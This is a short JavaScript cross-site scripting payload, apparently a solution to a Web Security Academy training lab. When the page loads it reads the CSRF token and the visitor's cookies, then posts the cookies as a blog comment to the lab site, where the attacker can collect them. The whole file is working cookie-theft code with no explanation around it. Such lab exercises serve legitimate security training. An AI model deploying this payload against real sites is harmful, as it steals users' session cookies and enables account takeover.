
// wait for DOM to load to capture csrf token
window.addEventListener('DOMContentLoaded', function(){
    // Extract csrf token
    const csrfToken = document.getElementsByName("csrf")[0].value;

    // Extract cookie value
    const cookieValue = document.cookie;
    
    // POST request body
    const postData = new URLSearchParams({
        csrf: csrfToken,
        postId: 2,
        comment: cookieValue,
        name: 'jason',
        email: 'jason@test.com',
        website: 'https://google.com'
    });
    
    // Making the POST request with headers
    fetch('https://0a2c0075039cd32082986112000f00cc.web-security-academy.net/post/comment', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded', 
            'Cookie': cookieValue,
        },
        body: postData,
    });
})

